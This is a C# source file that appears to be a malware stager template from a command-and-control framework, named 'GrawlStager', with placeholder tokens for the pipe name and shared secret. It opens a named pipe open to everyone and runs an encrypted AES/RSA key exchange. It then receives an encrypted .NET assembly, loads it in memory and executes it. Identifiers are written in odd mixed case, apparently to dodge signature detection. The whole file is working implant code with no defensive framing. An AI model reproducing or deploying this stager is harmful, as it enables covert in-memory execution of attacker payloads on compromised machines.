using System;
using System.Net;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.IO;
using System.IO.Pipes;
using System.IO.Compression;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Security.Cryptography;

namespace GrawlStager
{
    public class GrawlStager
    {
        public GrawlStager()
        {
            ExecLevel();
        }
        [STAThread]
        public static void Main(string[] args)
        {
            new GrawlStager();
        }
        public static void Execute()
        {
            new GrawlStager();
        }
        public void ExecLevel()
        {
            try
            {
                string ProfileWriteFormat = @"{{REP_PROF_WRITE_FORMAT}}".Replace(Environment.NewLine, "\n");
                string ProfileReadFormat = @"{{REP_PROF_READ_FORMAT}}".Replace(Environment.NewLine, "\n");
                string PipeName = @"{{REP_PIPE_NAME}}";

                string aANOTHERID = @"{{REP_GRAWL_ANOTHERID}}";
                string ANOTHERID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                byte[] SetupKeyBytes = Convert.FromBase64String(@"{{REP_GRAWL_SHARED_SECRET_PASSWORD}}");
                string MessageFormat = @"{{""ANOTHERID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncMsg"":""{4}"",""HMAC"":""{5}""}}";

                Aes InstallAESKey = Aes.Create();
                InstallAESKey.Mode = CipherMode.CBC;
                InstallAESKey.Padding = PaddingMode.PKCS7;
                InstallAESKey.Key = SetupKeyBytes;
                InstallAESKey.GenerateIV();
                HMACSHA256 hmac = new HMACSHA256(SetupKeyBytes);
                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048, new CspParameters());

                byte[] RSAPublicKeyBytes = Encoding.UTF8.GetBytes(rsa.ToXmlString(false));
                byte[] EncryptedRSAPublicKey = InstallAESKey.CreateEncryptor().TransformFinalBlock(RSAPublicKeyBytes, 0, RSAPublicKeyBytes.Length);
                byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);
                string FirstBody = String.Format(MessageFormat, aANOTHERID + ANOTHERID, "0", "", Convert.ToBase64String(InstallAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));

                string transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(FirstBody));
                NamedPipeServerStream pipe = null;
                string FirstResponse = "";
                PipeSecurity ps = new PipeSecurity();
                ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                pipe = new NamedPipeServerStream(PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                pipe.WaitForConnection();
                System.Threading.Thread.Sleep(5000);
                var FirstBytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, ANOTHERID));
                Write(pipe, FirstBytes);
                FirstResponse = Encoding.UTF8.GetString(Read(pipe));
                string extracted = Parse(FirstResponse, ProfileReadFormat)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                List<string> parsed = Parse(extracted, MessageFormat);
                string iv64str = parsed[3];
                string messAgE64str = parsed[4];
                string hash64str = parsed[5];
                byte[] messAgEbytes = Convert.FromBase64String(messAgE64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messAgEbytes))) { return; }
                InstallAESKey.IV = Convert.FromBase64String(iv64str);
                byte[] Partdecrypted = InstallAESKey.CreateDecryptor().TransformFinalBlock(messAgEbytes, 0, messAgEbytes.Length);
                byte[] Fulldecrypted = rsa.Decrypt(Partdecrypted, true);

                Aes SessKEy = Aes.Create();
                SessKEy.Mode = CipherMode.CBC;
                SessKEy.Padding = PaddingMode.PKCS7;
                SessKEy.Key = Fulldecrypted;
                SessKEy.GenerateIV();
                hmac = new HMACSHA256(SessKEy.Key);
                byte[] challenge1 = new byte[4];
                RandomNumberGenerator rng = RandomNumberGenerator.Create();
                rng.GetBytes(challenge1);
                byte[] EncChallEnge1 = SessKEy.CreateEncryptor().TransformFinalBlock(challenge1, 0, challenge1.Length);
                hash = hmac.ComputeHash(EncChallEnge1);

                string SeccondBody = String.Format(MessageFormat, ANOTHERID, "1", "", Convert.ToBase64String(SessKEy.IV), Convert.ToBase64String(EncChallEnge1), Convert.ToBase64String(hash));
                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(SeccondBody));

                string SeccondResponse = "";
                var SeccondBytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, ANOTHERID));
                Write(pipe, SeccondBytes);
                SeccondResponse = Encoding.UTF8.GetString(Read(pipe));
                extracted = Parse(SeccondResponse, ProfileReadFormat)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                parsed = Parse(extracted, MessageFormat);
                iv64str = parsed[3];
                messAgE64str = parsed[4];
                hash64str = parsed[5];
                messAgEbytes = Convert.FromBase64String(messAgE64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messAgEbytes))) { return; }
                SessKEy.IV = Convert.FromBase64String(iv64str);

                byte[] DecryptChallEnges = SessKEy.CreateDecryptor().TransformFinalBlock(messAgEbytes, 0, messAgEbytes.Length);
                byte[] challenge1Test = new byte[4];
                byte[] challenge2 = new byte[4];
                Buffer.BlockCopy(DecryptChallEnges, 0, challenge1Test, 0, 4);
                Buffer.BlockCopy(DecryptChallEnges, 4, challenge2, 0, 4);
                if (Convert.ToBase64String(challenge1) != Convert.ToBase64String(challenge1Test)) { return; }

                SessKEy.GenerateIV();
                byte[] EncChallEnge2 = SessKEy.CreateEncryptor().TransformFinalBlock(challenge2, 0, challenge2.Length);
                hash = hmac.ComputeHash(EncChallEnge2);

                string ThirdBody = String.Format(MessageFormat, ANOTHERID, "2", "", Convert.ToBase64String(SessKEy.IV), Convert.ToBase64String(EncChallEnge2), Convert.ToBase64String(hash));
                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(ThirdBody));

                string ThirdResponse = "";
                var ThirdBytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, ANOTHERID));
                Write(pipe, ThirdBytes);
                ThirdResponse = Encoding.UTF8.GetString(Read(pipe));
                extracted = Parse(ThirdResponse, ProfileReadFormat)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                parsed = Parse(extracted, MessageFormat);
                iv64str = parsed[3];
                messAgE64str = parsed[4];
                hash64str = parsed[5];
                messAgEbytes = Convert.FromBase64String(messAgE64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messAgEbytes))) { return; }
                SessKEy.IV = Convert.FromBase64String(iv64str);
                byte[] DecryptedAssembly = SessKEy.CreateDecryptor().TransformFinalBlock(messAgEbytes, 0, messAgEbytes.Length);
                Assembly grawlAssembly = Assembly.Load(DecryptedAssembly);
                grawlAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { ANOTHERID, SessKEy, pipe, PipeName });
            }
            catch (Exception e) { Console.Error.WriteLine(e.Message); }
        }

        public static void Write(PipeStream pipe, byte[] bytes)
        {
            byte[] compressed = Compress(bytes);
            byte[] size = new byte[4];
            size[0] = (byte)(compressed.Length >> 24);
            size[1] = (byte)(compressed.Length >> 16);
            size[2] = (byte)(compressed.Length >> 8);
            size[3] = (byte)compressed.Length;
            pipe.Write(size, 0, size.Length);
            var writtenBytes = 0;
            while (writtenBytes < compressed.Length)
            {
                int bytesToWrite = Math.Min(compressed.Length - writtenBytes, 1024);
                pipe.Write(compressed, writtenBytes, bytesToWrite);
                writtenBytes += bytesToWrite;
            }
        }

        private static byte[] Read(PipeStream pipe)
        {
            byte[] size = new byte[4];
            int ToTalReaDBytes = 0;
            do
            {
                ToTalReaDBytes += pipe.Read(size, 0, size.Length);
            } while (ToTalReaDBytes < size.Length);
            int len = (size[0] << 24) + (size[1] << 16) + (size[2] << 8) + size[3];
            
            byte[] buffer = new byte[1024];
            using (var ms = new MemoryStream())
            {
                ToTalReaDBytes = 0;
                int readBytes = 0;
                do
                {
                    readBytes = pipe.Read(buffer, 0, buffer.Length);
                    ms.Write(buffer, 0, readBytes);
                    ToTalReaDBytes += readBytes;
                } while (ToTalReaDBytes < len);
                return Decompress(ms.ToArray());
            }
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
            if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'grp0'.*)"); }
            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'grp1'.*)"); }
            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'grp2'.*)"); }
            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'grp3'.*)"); }
            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'grp4'.*)"); }
            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'grp5'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
            if (match.Groups["grp0"] != null) { matches.Add(match.Groups["grp0"].Value); }
            if (match.Groups["grp1"] != null) { matches.Add(match.Groups["grp1"].Value); }
            if (match.Groups["grp2"] != null) { matches.Add(match.Groups["grp2"].Value); }
            if (match.Groups["grp3"] != null) { matches.Add(match.Groups["grp3"].Value); }
            if (match.Groups["grp4"] != null) { matches.Add(match.Groups["grp4"].Value); }
            if (match.Groups["grp5"] != null) { matches.Add(match.Groups["grp5"].Value); }
            return matches;
        }

        private static byte[] Decompress(byte[] compressed)
        {
            using (MemoryStream inputStream = new MemoryStream(compressed.Length))
            {
                inputStream.Write(compressed, 0, compressed.Length);
                inputStream.Seek(0, SeekOrigin.Begin);
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deFlatEstream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = deFlatEstream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            outputStream.Write(buffer, 0, bytesRead);
                        }
                    }
                    return outputStream.ToArray();
                }
            }
        }

        public static byte[] Compress(byte[] bytes)
        {
            byte[] packedbytes;
            using (MemoryStream memOrYstream = new MemoryStream())
            {
                using (DeflateStream deFlatEstream = new DeflateStream(memOrYstream, CompressionMode.Compress))
                {
                    deFlatEstream.Write(bytes, 0, bytes.Length);
                }
                packedbytes = memOrYstream.ToArray();
            }
            return packedbytes;
        }

        // {{REP_PROF_MESSAGE_TRANSFORM}}
    }
}
